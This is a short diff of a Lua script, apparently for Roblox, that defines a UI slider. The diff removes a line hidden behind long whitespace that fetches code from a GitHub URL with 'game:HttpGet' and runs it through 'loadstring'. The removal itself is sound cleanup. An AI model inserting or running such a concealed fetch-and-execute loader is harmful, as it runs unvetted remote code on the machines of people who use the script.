@@ -16,4 +16,4 @@ local Slider = Tab:Slider({
     Callback = function(value)
         print(value)
     end
-})        loadstring(game:HttpGet('https://raw.githubusercontent.com/2344XDDDD/BEN-scrpit/refs/heads/main/112121'))()
+}) 
